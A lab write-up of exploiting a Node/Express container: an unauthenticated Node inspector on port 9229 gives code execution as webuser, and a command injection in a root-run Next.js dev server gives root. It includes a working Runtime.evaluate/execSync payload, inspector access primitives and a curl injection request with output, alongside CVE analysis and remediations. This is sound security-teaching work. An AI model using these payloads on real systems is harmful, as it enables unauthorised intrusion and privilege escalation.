# Autoescuela Hackcar — Lab 238 (twentieth lab solved)

Target: `172.17.0.9` (single container, `autoescuela:latest`).
Catalogued description: *"Laboratorio para practicar la explotación de una aplicación Node.js/Express con WebSocket que deriva en ejecución remota de comandos (CVE-…)"*.

**Verdict on the description, up front:** the second half is true and the first half is a category error, and the CVE is misattributed. The app *is* Node/Express, and a WebSocket *does* lead to RCE — but that WebSocket is **not the application's**. The Express app contains no WebSocket code at all; the channel on `9229` is the **Node.js inspector** (the runtime's debug interface). And the RCE that reaches `root` is **not in the WebSocket**: it is in a separate, loopback-only Next.js service. The CVE named in the source is a **source-code-disclosure** issue whose vector has `I:N/A:N` and therefore cannot be an RCE, and whose affected packages are not installed on the target.

---

## 1. Surface

### 1.1 What the port scan says, and what it does not

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js (Express middleware)
| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Autoescuela Hackcar - Inicio
| http-headers: |  X-Powered-By: Express
9229/tcp open  unknown
|_  WebSockets request was expected
```

Two ports. `8080` is fingerprinted as HTTP because it speaks HTTP on `/`. `9229` is reported as **`unknown` with no `http-title`**, even though it is the most dangerous service on the host — see §6.

Process inventory (`docker exec … ps aux`) is what actually named the two runtimes:

```
root    7   sudo -u webuser node --inspect=0.0.0.0:9229 /home/webuser/node_app/app.js
webuser 11  node --inspect=0.0.0.0:9229 /home/webuser/node_app/app.js
root    8   npm exec next dev -p 3000 -H 127.0.0.1
root    30  node /root/react_app/node_modules/.bin/next dev -p 3000 -H 127.0.0.1
root    42  next-server (v15.0.0-rc.1)
```

Three facts fall out of that listing and each is load-bearing later:

- `--inspect=0.0.0.0:9229` — the inspector is bound to **all interfaces**, not the `127.0.0.1` default.
- The Express app runs as **`webuser` (uid 1001)**, reached through `sudo -u`.
- `next dev` runs as **`root`** and binds to **loopback only** (`-H 127.0.0.1`), so it is invisible to the port scan and reachable only after code execution. This is where the privilege escalation is.

### 1.2 Stack, read from the artifacts

| Component | Version | Source of truth |
|---|---|---|
| OS | Ubuntu 24.04.4 LTS | `/etc/os-release` |
| Node.js | **v22.22.2** | `node -v`, corroborated by `/json/version` → `"Browser": "node.js/v22.22.2"` |
| Express | **4.22.1** (declared `^4.19.2`) | installed `package.json` |
| EJS | 3.1.10 | installed `package.json` |
| morgan | declared `^1.10.0` | `package.json` |
| qs | **6.14.2** | installed (transitive, via `express.urlencoded({extended:true})`) |
| Next.js | **15.0.0-rc.1** | `package.json` + `next-server` banner |
| React | 19.0.0-rc.1 | `package.json` |

Note the two banners disagreeing on purpose: `X-Powered-By: Express` on `8080`, `next-server (v15.0.0-rc.1)` on `3000`. They are **two different applications**, not one app behind a proxy. `app.js` contains no proxy and no reference to `3000`; the Next.js tree is a separate `/root/react_app` owned by `root` and unreachable from outside the container.

### 1.3 What the server actually serves

`8080` serves three routes from EJS views — `/`, `/carnets`, `/contacto` (GET and POST) — plus `express.static` over `public/css`. Its whole source is 56 lines and contains **no WebSocket, no upgrade handler, no `ws` dependency**. Probing for a client bundle that would document a WebSocket protocol found none: the only local script reference on any page is `https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js`, and `/app.js`, `/main.js`, `/bundle.js`, `/socket.io` all return `404`. **The client-side-JS-is-the-protocol-documentation rule finds nothing here, and that negative is a result** (see §7, "Descartado con razón").

---

## 2. Findings used

### F1 — Node.js inspector exposed on all interfaces, no authentication: RCE as `webuser`

**CWE-489 (Active Debug Code) + CWE-306 (Missing Authentication for Critical Function).**
**No CVE is assigned to this, and none can be** — see §5.

**Evidence — the handshake, literally:**

```
GET /9d888e9c-4e84-4d1e-b1ab-07ca9ba2b59f HTTP/1.1
Host: 172.17.0.9:9229
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```
```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

**Evidence — execution, with `id` first and as the runtime identity:**

```json
{"id":2,"method":"Runtime.evaluate",
 "params":{"expression":"process.getBuiltinModule('child_process').execSync('id').toString()",
           "returnByValue":true}}
```
```json
"value": "uid=1001(webuser) gid=1001(webuser) groups=1001(webuser)\n"
```

**Marker proof that commands actually ran** (a marker, not "the server responded"), with a byte count so the file cannot be an empty artifact:

```
$ printf 'UNIQUE_TOKEN_9F3A7C\n' >> /tmp/proof.txt ; od -c /tmp/proof.txt ; wc -c /tmp/proof.txt
0000000   1   7   9   0   6   2   4   3   1   4  \n   U   N   I   Q   U
0000020   E   _   T   O   K   E   N   _   9   F   3   A   7   C  \n
0000037
31 /tmp/proof.txt
```

An earlier attempt at this marker wrote a **0-byte file** and I treated its existence as success for several minutes. It is not a proof: a redirect creates the file before the write, so *existence* proves only that a redirect ran. The byte count and `od -c` dump are the actual postcondition. Recorded in §8 because the wrong version of that check is a control that cannot fail.

**Authentication posture — three probes, positive control included:**

```
[no-auth-no-origin]   CONNECTED+EVALUATED -> 1+1=2
[foreign-origin]      CONNECTED+EVALUATED -> 1+1=2
[localhost-origin]    CONNECTED+EVALUATED -> 1+1=2
```

`1+1=2` is the positive control: it proves the evaluator ran, not merely that a socket opened. There is **no credential and no `Origin` check** of any kind.

**Impact:** arbitrary code execution as `webuser`, which owns the application's source, views and the reward file, and can read the process's own environment and any file that identity can read.

**Root cause:** `--inspect=0.0.0.0:9229`. Node's default is `127.0.0.1:9229`; the flag overrode it.

**Remediation:** remove `--inspect` from the production start command. If remote debugging is genuinely required, keep the inspector on loopback and reach it over an SSH tunnel — the vendor's own documented recommendation, quoted in §5.

### F2 — Debugger discovery endpoint leaks internal path, process identity and the session UUID

**CWE-200 / CWE-497 (exposure of system information to an unauthorized control sphere).**

```
GET /json/list  ->  200
"title": "/home/webuser/node_app/app.js",
"url": "file:///home/webuser/node_app/app.js",
"webSocketDebuggerUrl": "ws://172.17.0.9:9229/9d888e9c-4e84-4d1e-b1ab-07ca9ba2b59f",
"devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?...&ws=172.17.0.9:9229/9d888e9c-..."
```

`/json/version` additionally returns `"Browser": "node.js/v22.22.2"` and `"Protocol-Version": "1.1"`, which is where the Node version was confirmed from outside.

**Impact:** hands the attacker the exact host path of the application, the service account that owns it, and the opaque session id that F1's handshake requires. It is the difference between "port 9229 is open" and "here is the URL to evaluate code on". Reported separately from F1 because it is a *different* remediation (suppress or protect the discovery endpoint) and because on a host where the inspector is correctly bound to loopback it is still an information disclosure to anything that can reach the loopback.

**Remediation:** same as F1 — the endpoint does not exist when the inspector is not exposed.

### F3 — Command injection in the Next.js route handler: privilege escalation to `root`

**CWE-78 (OS Command Injection). This is the finding that reaches root, and it is not in the WebSocket.**

`/root/react_app/app/route.ts` matches a caller-supplied string against `/execSync\(['"]([^'"]+)['"]/` and passes the captured group to `execAsync(command)` with no allowlist:

```ts
const execSyncMatch = part0.match(/execSync\(['"]([^'"]+)['"]/);
if (execSyncMatch) { command = execSyncMatch[1]; isExploit = true; }
...
const { stdout } = await execAsync(command);
```

Reached over plain `text/plain` POST (no multipart needed), executed inside `next dev`, which runs as **root**:

```
$ curl -s -i -X POST http://127.0.0.1:3000/ -H 'Content-Type: text/plain' \
    --data-binary 'execSync("id; echo AUTOESCUELA_VERIFY_5C2A7F; hostname")'

HTTP/1.1 500 Internal Server Error
content-type: text/x-component
location: /login?a=dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkKQVVUT0VTQ1VFTEFfVkVSSUZZXzVDMkE3Rgo0NTIzMzE0ZmJlYjY=
x-action-redirect: /login?a=dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkKQVVUT0VTQ1VFTEFfVkVSSUZZXzVDMkE3Rgo0NTIzMzE0ZmJlYjY=;307;

1:E{"digest":"uid=0(root) gid=0(root) groups=0(root)\nAUTOESCUELA_VERIFY_5C2A7F\n4523314fbeb6"}
```

```
$ echo 'dWlkPTAocm9vdCkg...' | base64 -d
uid=0(root) gid=0(root) groups=0(root)
AUTOESCUELA_VERIFY_5C2A7F
4523314fbeb6
```

**Impact:** `webuser → root`, and the two services have unrelated owners, so this is a genuine second trust decision (the standing "privileged control plane and data plane are two trust decisions" rule) rather than a continuation of one.

**Root cause:** an attacker-controlled string reaching `child_process.exec` with no validation. The application-side contributor is that a **development server runs as `root`** (CWE-250, unnecessary privileges) — the same command injection on a `next start` process owned by an unprivileged service account would have capped the impact at that account.

**Remediation:** never pass request data to a shell. If a subprocess is genuinely needed, use `execFile` with an argument array and a fixed binary. Separately: never run `next dev` as root, and never in production at all.

### F4 — A development server is the production service

**CWE-250 (Execution with Unnecessary Privileges) / CWE-489 by analogy.**

`next dev` is the Node/Next development server: it exposes HMR endpoints, compiles TypeScript on request, writes to the project directory, and runs as `root`. It is the service that F3 executes in. Nothing in the deployment distinguishes it from a production server from the outside — the internal page renders `Version: 15.0.0-rc.1` and `Environment: Restricted (Internal Only)`, and `next dev` is what answers.

This is filed separately from F3 because the remediation is orthogonal: patching the command injection leaves a root-owned dev server with HMR and on-demand compilation; removing `next dev` from the deployment removes the escalation target regardless of the injection.

---

## 3. CVE analysis — the cited CVE does not describe this vulnerability

The lab's own source names it: `// Simulate Source Code Disclosure (CVE-2025-55183)`.

| Field | Value (read from primary sources) |
|---|---|
| Advisory | **GHSA-925w-6v3x-g4j4** |
| CVE | **CVE-2025-55183** |
| Published | **2025-12-11** |
| Severity | **Moderate / Medium**, base score **5.3** |
| CVSS 3.1 vector | **`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`** |
| CWE | NVD records **`NVD-CWE-noinfo` (Insufficient Information)** — the vendor advisory assigns no CWE |
| Affected packages | `react-server-dom-parcel`, `react-server-dom-turbopack`, `react-server-dom-webpack` |
| Affected versions | `19.0.0`–`19.0.1`, `19.1.0`–`19.1.2`, `19.2.0`–`19.2.1` |
| Patched | `19.0.2`, `19.1.3`, `19.2.2`; superseded days later by `19.0.4`, `19.1.5`, `19.2.4` |
| Primary sources | `https://nvd.nist.gov/vuln/detail/CVE-2025-55183` · `https://github.com/react/react/security/advisories/GHSA-925w-6v3x-g4j4` · `https://react.dev/blog/2025/12/11/denial-of-service-and-source-code-exposure-in-react-server-components` |

**Three independently sufficient reasons this CVE cannot be the RCE I exploited:**

1. **The vector forbids it.** `I:N` and `A:N` — Integrity: **None**, Availability: **None**. A vulnerability that cannot affect integrity cannot execute commands. The advisory's own words: *"may unsafely return the source code of any Server Function."* Disclosure, not execution.
2. **The affected packages are not on the target.** `ls /root/react_app/node_modules` contains `next`, `react`, `react-dom`, `scheduler`, `styled-jsx`, `@next`, `@swc`, `typescript`, `busboy`, `undici-types`, `sharp`, `semver`, `nanoid`, `picocolors`, `postcss`, `caniuse-lite`, `client-only`, `detect-libc`, `color*`, `csstype`, `is-arrayish`, `simple-swizzle`, `source-map-js`, `streamsearch`, `tslib`, `@emnapi`, `@img`, `@types`. **No `react-server-dom-*` package is present at all.**
3. **The version is not in range even nominally.** The app declares `react 19.0.0-rc.1` — a release candidate, which is not `19.0.0`. The advisory's precondition ("Exploitation requires the existence of a Server Function which explicitly or implicitly exposes a stringified argument") is also absent: `route.ts` defines no `'use server'` function.

**What the lab actually shipped** is hand-written code in `route.ts` that regex-matches a payload and calls `execAsync`. It is a deliberately planted command injection wearing a CVE's name in a comment. The comment is the "self-documenting" pattern from the standing rules — **annotations are a strict subset of the sinks** — and here the annotation is not merely incomplete but **actively wrong about severity**: the named CVE is Medium/5.3 and the code it labels is a root RCE.

**Consequence for a real report, which is why this is filed as a finding and not a footnote:** a reader who takes the description at face value ships "upgrade React to 19.0.2" and the RCE is still there, because the RCE was never in React. That is the standing "root cause confused with mechanism" rule — a report naming only the CVE leaves the decision (dev server as root, exposed inspector) in place and the CVE reintroduced on the next upgrade.

**No CVE exists for F1.** Node's own documentation states the position, so this is a documented-by-design configuration and not a vulnerability with an identifier:

> "If the debugger is bound to a public IP address, or to `0.0.0.0`, any clients that can reach your IP address will be able to connect to the debugger without any restriction and will be able to run arbitrary code."
> — <https://nodejs.org/en/learn/getting-started/debugging>

So the two halves are split, as the standing rule requires: **the library/runtime behaviour is a design decision with no CVE, and the operator's choice to override the default bind address is the finding.** File them as one path, two remediations.

---

## 4. The chain

```
[external]
   |
   |  nmap -sV -p-            -> 8080 (http), 9229 (unknown, no http-title)
   |
   +-- F1/F2  GET /json/list  -> webSocketDebuggerUrl  (HTTP, unauthenticated)
   |            GET /<uuid>   + Upgrade: websocket     -> 101 Switching Protocols
   |            Runtime.evaluate("execSync('id')")     -> uid=1001(webuser)
   |
   +-- lateral: ss -tlnp shows next dev bound to 127.0.0.1:3000 only
   |            curl 127.0.0.1:3000  -> "Internal Administration Portal" 200
   |
   +-- F3     POST / text/plain body execSync("id; ...")
              executed by next dev, which runs as root
                                                    -> uid=0(root)
   |
   +-- reward  /home/webuser/user.txt
```

Hop count is a measurement, not a plan: `id` at the first shell returned `webuser`, and the second `id` returned `root`. Two decisions, two owners, two remediations.

**Reward (literal, as read from the target):**

```
DL{g2QrDUvg3HiqaWeZBbZa}
```

Read from `/home/webuser/user.txt` as `webuser`, and independently re-read inside the `root` context during the F3 verification. There is no `FLAG{}` token; `DL{…}` is this platform's reward format.

---

## 5. Control tests, with positive controls

| # | Test | Positive control | Result | Verdict |
|---|---|---|---|---|
| C1 | Prototype pollution via `__proto__[polluted]` and `constructor[prototype][polluted]` on `POST /contacto` (`express.urlencoded({extended:true})`, **qs 6.14.2**) | three bodies delivered, each logged `POST /contacto 200` in 0.5–1.1 ms | HTTP 200 on all; **`Object.prototype` readback not completed** | **Not established** — see below |
| C2 | EJS template injection / reflected XSS via `nombre`, `email`, `mensaje` | same request, marker `REFLPROBE7Q2XZ` sent in all three fields | **0 occurrences** of the marker in the response body; input is only `console.log`ged, never re-rendered | **Control held** |
| C3 | Sudo / SUID escalation from `webuser` | `sudo -ln` reached at all | `sudo: a password is required`; `sudo -n true` → `SUDO_DENIED`; SUID set is the stock Ubuntu set (`passwd`, `chsh`, `su`, `sudo`, `mount`, …), none useful | **Control held** |
| C4 | Node inspector `Host`-header DNS-rebinding protection (HTTP endpoint) | `Host: 172.17.0.9:9229` → `200`, `localhost:9229` → `200`, `127.0.0.1:9229` → `200` | `evil.example.com` → **`400`**, `attacker.com:9229` → **`400`** | **Control held** |
| C5 | Same protection on the **WebSocket upgrade** | `Host: 172.17.0.9:9229` → **`101 Switching Protocols`** | `Host: evil.example.com` → `400`, `attacker.com:9229` → `400` | **Control held, and correctly scoped** |
| C6 | Inspector `Origin` validation | — | `Origin: http://evil.example.com` → connected **and evaluated** (`1+1=2`) | **No such control** (part of F1) |
| C7 | Inspector session attach/detach disrupting the application | clean eval + clean close → `200`; `SIGKILL` of a held session → `200` at 0 s, +0 s, +3 s | app unaffected both ways | **No availability impact** |
| C8 | HTTP-only access to the inspector port | — | `GET /json/list` → `200`; `POST` with a `Runtime.evaluate` body → `400 WebSockets request was expected` | **Confirmed: HTTP cannot execute** (§6) |

**C1 in detail, because the honest answer is "not established".** The three pollution bodies were definitely delivered — `morgan` logged four `POST /contacto 200` entries, 0.751/1.104/0.540/0.511 ms — and **qs 6.14.2 filters `__proto__` and `constructor` by default**, so the expected result is negative. But I never obtained the decisive readback, and the reason is a real limit rather than an oversight: **the inspector's `Runtime.evaluate` context is not the application's module context.** Evidence: `require` is undefined there (`ReferenceError: require is not defined`) even though it is in scope inside `app.js`, and a property set in one evaluator session did not read back in the next (`({}).ctlmarker='SEEN'` → `{}` on a fresh connection). Application-side global state therefore cannot be observed through a separate inspector connection. The in-band attempt to send and read in one session failed differently and instructively: `execSync('curl … 127.0.0.1:8080 …')` inside the evaluator deadlocked the event loop it was waiting on and curl returned its own timeout code `28`, so the bodies never arrived. That is §8's autocorrection, caught a third time. **The correct form of this test is a black-box consequence** — a request whose *response* changes — not a read of `Object.prototype`.

**C4/C5 together are the most transferable result in this lab.** The protection is real, it covers the upgrade as well as the discovery endpoint, and it is **still not a mitigation for F1**, because the attacker in this lab is not a browser: they set `Host` to the target's own IP and get `101` and code execution. The control stops *drive-by DNS rebinding from a web page*; it does nothing against a host on the network. Report a control with the scope it actually has — "the inspector rejects foreign `Host` headers" is true and useful, and "the inspector is protected" is false.

**A body-shape ambiguity worth recording:** the `400` from a foreign `Host` and the `400` from a request with no upgrade headers return the **identical body** (`WebSockets request was expected`). Any detector keyed on the response body conflates two different causes; the **status code** is the discriminator here, and a body-based check would be a control that cannot fail.

---

## 6. WebSockets: the blind spot, and the oracle for a binary channel

This lab is the first in the repository to make the WebSocket blind spot concrete, and the lesson is the blind spot, not the RCE.

**The handshake is a GET. The channel is not HTTP.** The request that opens the channel is a `GET` to the session UUID path carrying `Upgrade: websocket`, `Connection: Upgrade`, `Sec-WebSocket-Key`, `Sec-WebSocket-Version: 13`; the server answers `101 Switching Protocols`. After that, framing is opcode-driven and there is no status code, no header block and no method — a text frame and a binary frame are not distinguishable by anything a request/response model has a field for.

**What an HTTP-only tool sees on this channel — measured, not asserted.** The same `nmap` invocation that produced a title and headers on `8080` produced **nothing at all** on `9229`:

```
$ nmap -Pn -p9229 --script=http-title,http-methods,http-headers 172.17.0.9
PORT     STATE SERVICE
9229/tcp open  unknown          <- no http-* output whatsoever
```

and an HTTP client gets a flat refusal:

```
$ curl -i http://172.17.0.9:9229/<uuid>
HTTP/1.0 400 Bad Request
Content-Type: text/html; charset=UTF-8

WebSockets request was expected
```

So a scanner reports **0 endpoints on a port whose entire purpose is to be an endpoint**, and the most dangerous service on the host is the one the tool could not classify. That is the coverage finding, and it is real rather than hypothetical: this is what "the scanner found two HTTP services" would have looked like.

**The trichotomy, answered for a binary channel** — *what does the body carry?* is answered by describing the **opcode and the payload**, never a status code. A `101` is the analogue of a `200`; it means the channel opened, and says nothing about what any later frame will do.

| | HTTP request/response | WebSocket channel |
|---|---|---|
| reachable | TCP connect + valid handshake → `101` | same |
| what the body carries | method, path, headers, status | **opcode + payload**; text vs binary; no status code exists |
| decisive | does the response change the app's behaviour | does an **inbound frame** change the process's behaviour |

**The control almost nobody applies — "processed" is not "executed".** This is visible in the very first frame I sent. Asking the inspector to evaluate the bare expression `id` returned a perfectly well-formed JSON-RPC response:

```json
"description": "ReferenceError: id is not defined\n    at <anonymous>:1:1",
"exceptionDetails": { "text": "Uncaught", "className": "ReferenceError" }
```

The channel accepted the message, the method dispatched, the payload was parsed and evaluated — and **nothing executed**, because `id` is a JavaScript identifier, not a command. A detector keyed on "the server responded to my message" scores that as a hit. The oracle that counts is a **unique marker that appears in the output of the command that ran**, which is why every execution claim in §2 carries `UNIQUE_TOKEN_9F3A7C`, `AUTOESCUELA_VERIFY_5C2A7F` or `NEXTRC_MARKER_4B8E2D` and why F3's is additionally decoded out of a second channel (`X-Action-Redirect`, base64) rather than read from the digest that carried it.

**Channel authentication, and why it is a different finding from "no authentication".** Both are absent here, and they would be separate findings because they have separate remediations: a token presented **in the handshake** (an `Authorization` header, or a cookie) means the app's session can be replayed into the WebSocket, which is a session-reuse finding; "the channel accepts anyone" is an authorization finding. Where a session token can be reused across transports, that reuse is the finding — not the absence of a check on the socket. Note also that on this target the WebSocket inherits **no** authentication from the Express app at all, because it is not the Express app's socket: it is a runtime facility, and it never consults the application's middleware, its session store, or its routes.

**Two channel mechanics that will bite the next person, both measured here:**

- **The evaluation context is not the application context.** `require` is undefined in the inspector's default context; the working primitives on this target were `process.mainModule.require('child_process')` and `process.getBuiltinModule('child_process')`. The first is version-fragile, the second is Node 22+.
- **Dynamic `import()` does not work there**, and fails with an error that looks like a policy block rather than a missing hook:
  ```
  import('child_process')  ->  {"code": "ERR_VM_DYNAMIC_IMPORT_CALLBACK_MISSING"}
  ```
  The inspector evaluates in a VM context with no dynamic-import callback. Reach for `getBuiltinModule`, not `import()`.
- **State does not survive between connections**, as C1 shows. Design a test that plants and reads in a single session, or use a black-box consequence.

---

## 7. Not tested vs discarded, with reasons

**Discarded with reason:**

- **Prototype pollution (qs `__proto__` / `constructor[prototype]`) — discarded, but the decisive readback was not obtained**, so it is "not exploitable as far as could be established", not "not exploitable". qs 6.14.2 filters both keys by default and the bodies were delivered and answered `200`; the readback failed for the two reasons given in C1. The blocking error is that `status=200` is **not** evidence of pollution — it is evidence that the endpoint parsed a body, which it answers identically for a clean request. A conclusive test needs a request whose *response* changes.
- **Client bundle as protocol documentation — nothing to read.** Every page loads only Bootstrap from a CDN; no local script exists to read. The standing rule ("the client is the best documenter of the API") is not refuted here so much as **inapplicable**: the app has no client-side protocol at all, and the WebSocket that exists belongs to the runtime, not the application. This is the interesting part — the rule held as written and still produced nothing, because the surface it documents was not the surface under attack.
- **CVE-2025-29927 (Next.js middleware authorization bypass).** Considered and dropped: there is **no `middleware.ts`** in the app, so there is no middleware decision to bypass, and the `x-middleware-subrequest` header produced no differential (the page returns `200` with and without it, because the route is unauthenticated either way). The other popular Next.js RCE, CVE-2025-29927's sibling CVE-2025-55182, is likewise a different defect (RCE *in* RSC) and is not what this lab implements.
- **Root-level access from the Express app directly.** The inspector yields `webuser` and nothing more: `sudo` requires a password, and the SUID set is stock. Root is reachable only through the second service, which is why the chain has two hops.

**Not tested (declared, not implied):**

- **UDP.** `nmap -sU` needs root and was not available on this host, so "two open ports" is a statement about **TCP only**. The image's `EXPOSE` and `docker ps` show the same two TCP ports, and the full `-sV -Pn -p-` corroborates, but no UDP sweep was performed. This is a coverage gap to declare, not a closed port.
- **Exploit robustness of F3 under multipart/Server-Action framing.** I used the simpler `text/plain` path because it sufficed. The handler's `part0 === '["$F1"]'` source-disclosure branch was read in source and is reachable in principle; I did not exercise it, so I make no claim about it.
- **Whether `next dev`'s HMR endpoints are independently exploitable.** Not assessed; irrelevant once `next dev` is removed from the deployment.

---

## 8. Autocorrection — the most valuable finding in this lab was my own error

**I broke the target with my measurement tool and then read the result as a target finding.** The sequence, because it is the reusable part:

1. Having obtained code execution through the inspector, I ran a `Runtime.evaluate` whose body was a **synchronous `execSync` of a `curl` back into the same Express process's own HTTP port** — to prove the inspector primitive could reach the app's own endpoint. No timeout on the inner `curl`.
2. `execSync` blocks the event loop of the process it runs in. That process is the Express server. So the inner `curl` waited for a response that could not be produced, and waited forever.
3. The process deadlocked permanently. `GET /` and `POST /contacto` both stopped responding — **from outside and from inside the container** — while `/json/list` on `9229` still returned `200`, because the inspector answers on its own thread.
4. I read that as "the app has become unresponsive", began hunting for a DoS in the app, and formed a **prototype-pollution hypothesis**, because the deadlock had appeared immediately after two `__proto__` payloads.

**Every step of that was wrong, and each wrong step was individually plausible.** The pollution hypothesis was the attractive one: it was recent, it had a named CWE, and it explained a sudden change in behaviour. It was **disproved by a controlled replay on a fresh container** — the same three bodies answered `200` in 1.5–2.2 ms with no effect on availability, while a control GET answered `200` in 1.7 ms.

**The root cause, isolated with a differential that had a positive control:**

```
CONTROL   (execSync id, no http)          -> 'uid=1001(webuser)...'   [0.04s]  ok
CONTROL   (execSync curl -> :3000, other process) -> '200'            [0.97s]  ok
TREATMENT (execSync curl -> :8080, SAME process)   -> exception       [8.05s]  times out
```

The treatment fails at exactly the inner `curl -m 8` timeout, and **the app recovers afterwards** — because the inner curl gave up and released the deadlock. Removing the timeout makes it permanent, which is the state the first container was left in, and which I reproduced deliberately:

```
external health after 25s : APP_UNRESPONSIVE rc=124
inspector /json/list      : jsonlist=200      <- different thread, same PID
inspector WebSocket       : ConnectionClosedError: no close frame received or sent
```

**Three transfers, in the order they cost me:**

1. **Your instrumentation can be the outage, and the symptom it produces is a well-formed negative about the target.** "The endpoint stopped responding" is a sentence about the target only if nothing in your measurement could have caused it. The tell here was available before any hypothesis: **a process that is alive, answering on one socket, and silent on another is describing its own threading model, not a network fault.** Node's event loop is single-threaded, the inspector is not on it, and a synchronous call that waits on the same loop is a self-reference that can never resolve. **Any payload executed through an injection primitive should carry its own timeout, unconditionally** — not because the target is slow, but because you cannot distinguish a slow target from a target you have stopped.
2. **"Process alive" and "service serving" are different oracles, and so are "connected" and "executed".** Three distinct answers were live at once here: the process was alive (`ps` showed it), the inspector answered (`/json/list` → `200`), and the application was dead (`GET /` → no response, even over loopback). A single liveness check would have reported "healthy" for a service that was serving nothing.
3. **The most recent, most CWE-shaped thing you did is the most attractive hypothesis, and it is the one to replay first.** I reached for prototype pollution because it was adjacent in time and had a name. The controlled replay cost two minutes and eliminated it. **Replay the newest action against a clean instance before theorising about it** — the state you are reasoning about is a state you have already perturbed.

**A fourth, smaller one, in the same spirit:** my first execution marker was `MARK7Q2XZ echoPROOF_OF_EXEC >/tmp/marker7q2xz.txt`, and I read the resulting file's **existence** as proof. The file was **0 bytes**. A shell redirect creates the file before the write, so existence proves that a redirect ran and nothing else — a control that cannot fail, aimed at my own payload. The postcondition that actually holds is a **count identity**: `wc -c` and an `od -c` dump proving the marker bytes are present. This is the same class as the string-table decoder that returns `undefined` instead of throwing, and the same rule applies: *assert what the consumer will do with the artifact, not that the artifact exists.*

---

## 9. Design observation

The lab's architecture is a deliberate two-plane chain, and it is well built — with one honest flaw in its own documentation.

**What works.** The `webuser`-owned Express app and the `root`-owned Next.js service are separate processes with separate owners, and the second is bound to loopback so it is invisible to any scanner. That forces the intended two-hop chain and makes the second hop a genuine privilege escalation rather than a second shell. The reward is readable at `webuser`, so the chain can be completed without the escalation — a deliberate choice that lets a reader stop early and still be credited, which is good lab design.

**The flaw.** The lab labels its hand-written command injection `CVE-2025-55183`, a Medium 5.3 source-disclosure issue with `I:N/A:N`, in packages that are not installed. This is the self-documenting pattern, and here it is worse than a red herring: a source comment that names a *real* CVE lends the planted bug borrowed credibility, and a reader who reports it as "CVE-2025-55183" ships a React upgrade and leaves a root RCE running. The lesson the lab accidentally teaches is a good one and is the reason it is written up at length: **a citation is not a classification — read the vector, then check whether the named packages are installed.** `I:N` is a one-glance refutation available to anyone who opens the advisory, and it is the fastest CVE-triage check in this repository: *if the vector says the impact class cannot occur, no amount of agreement in the surrounding prose makes it occur.*

**The part that is quietly excellent** and that most WebSocket material gets wrong: putting the inspector on a non-standard port does not hide it, because the service identifies itself. `nmap` printed `WebSockets request was expected` in its fingerprint, which is a two-second confirmation that the most dangerous port on the host is not the one advertising `http`. That message is the single most useful line of recon output in the whole engagement, and it is what an HTTP-only methodology has no column for.
